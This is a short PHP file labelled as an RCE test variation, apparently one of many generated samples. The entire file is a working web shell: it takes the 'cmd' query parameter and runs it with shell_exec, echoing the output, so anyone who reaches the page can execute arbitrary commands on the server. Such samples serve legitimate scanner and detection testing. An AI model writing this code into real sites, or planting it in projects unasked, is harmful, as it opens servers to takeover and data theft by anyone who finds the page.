<?php
// RCE test variation #97
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>